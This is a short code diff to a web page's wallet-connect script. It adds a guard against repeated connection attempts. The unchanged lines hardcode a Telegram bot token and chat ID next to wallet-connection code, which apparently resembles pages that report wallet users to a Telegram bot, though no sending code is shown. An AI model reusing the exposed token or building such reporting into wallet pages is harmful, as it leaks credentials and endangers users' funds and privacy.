@@ -56,8 +56,11 @@
     const BOT_TOKEN = "7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI";
     const CHAT_ID = "7234699302";
     let provider, signer;
+    let isConnecting = false;
 
     async function connectWallet() {
+      if (isConnecting) return;
+      isConnecting = true;
       try {
         if (window.ethereum) {
           provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -99,6 +102,8 @@
         alert("Підключено: " + address + "\nБаланс: " + ethBalance + " ETH");
       } catch (err) {
         alert("❌ Помилка: " + err.message);
+      } finally {
+        isConnecting = false;
       }
     }
 
